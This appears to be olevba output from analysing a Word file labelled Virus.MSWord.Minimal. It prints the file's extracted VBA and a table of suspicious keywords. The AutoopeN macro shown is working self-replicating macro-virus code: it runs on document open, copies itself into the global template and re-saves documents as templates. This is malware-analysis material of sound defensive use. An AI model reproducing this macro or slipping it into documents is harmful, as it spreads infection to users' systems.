olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.lo-4495662d9012a19eb9fbcc5e76f42d205f54d4b2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.lo-4495662d9012a19eb9fbcc5e76f42d205f54d4b2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoopeN.bas 
in file: Virus.MSWord.Minimal.lo-4495662d9012a19eb9fbcc5e76f42d205f54d4b2 - OLE stream: 'Macros/VBA/AutoopeN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim a$
Dim b$
On Error Resume Next: a$ = WordBasic.[FileName$]() + ":AutoopeN"
b$ = "Global:aUTOOPEn": WordBasic.MacroCopy a$, b$
WordBasic.FileSaveAs Format:=1: WordBasic.MacroCopy b$, a$
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoopeN            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

